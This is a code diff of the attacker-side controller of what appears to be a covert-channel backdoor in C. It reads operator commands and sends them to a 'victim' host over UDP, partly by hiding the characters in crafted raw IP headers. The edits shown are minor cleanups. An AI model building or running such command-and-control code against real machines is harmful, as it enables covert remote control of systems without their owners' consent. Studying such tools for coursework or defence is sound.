@@ -11,9 +11,9 @@ int main(void) {
     bpf_u_int32 maskp;
     pcap_t* nic_fd;
     struct bpf_program fp;
-
     pthread_t thread;
 
+    check_root_user();
     signal(SIGINT,sig_handler);
     program_setup();
     options_attacker_init(&opts);
@@ -164,7 +164,7 @@ void* select_call(void* arg) {
     struct options_attacker *opts = (struct options_attacker*)arg;
     struct sockaddr_in victim_address;
     char buffer[RECEIVE_SIZE] = {0};
-    char instruction[64] = {0}, s_buffer[SEND_SIZE] = {0}, t_buffer[SEND_SIZE] = {0};
+    char instruction[64] = {0}, s_buffer[SEND_SIZE] = {0};
     int len = sizeof(victim_address);
     int byte;
 
@@ -190,7 +190,6 @@ void* select_call(void* arg) {
     while (1) {
         if (exit_flag == 1) break;
         cpy_reads = reads;
-
         fd_num = select(fd_max + 1, &cpy_reads, 0, 0, &timeout);
         if (fd_num == -1) {
             perror("Select() failed");
@@ -205,9 +204,11 @@ void* select_call(void* arg) {
                     memset(buffer, 0, sizeof(char) * 256);
                 }
                 if (i == STDIN_FILENO) {
+                    puts("============ RESULT ============");
                     if (fgets(opts->victim_instruction, sizeof(opts->victim_instruction), stdin)) {
                         opts->victim_instruction[strlen(opts->victim_instruction) - 1] = 0;
                         if (strcmp(opts->victim_instruction, QUIT) == 0) {
+                            // TODO: CLOSE ENTIRE PROGRAM
                             sendto(opts->attacker_socket_udp, opts->victim_instruction, strlen(opts->victim_instruction), 0, (const struct sockaddr*)&victim_address, sizeof(victim_address));
                             puts("closing program ...");
                             close(opts->attacker_socket_udp);
@@ -222,7 +223,7 @@ void* select_call(void* arg) {
                             create_ip_header(&ih, instruction[j], opts);
                             memcpy(s_buffer, &ih, sizeof(struct iphdr));
                             memcpy(s_buffer + sizeof(struct iphdr), &uh, sizeof(struct udphdr));
-                            byte = sendto(opts->attacker_socket_udp, (const char*)s_buffer, SEND_SIZE, 0,
+                            byte = (int)sendto(opts->attacker_socket_udp, (const char*)s_buffer, SEND_SIZE, 0,
                                           (const struct sockaddr*)&victim_address, sizeof(victim_address));
                             if (byte < 0) {
                                 perror("send failed\n");
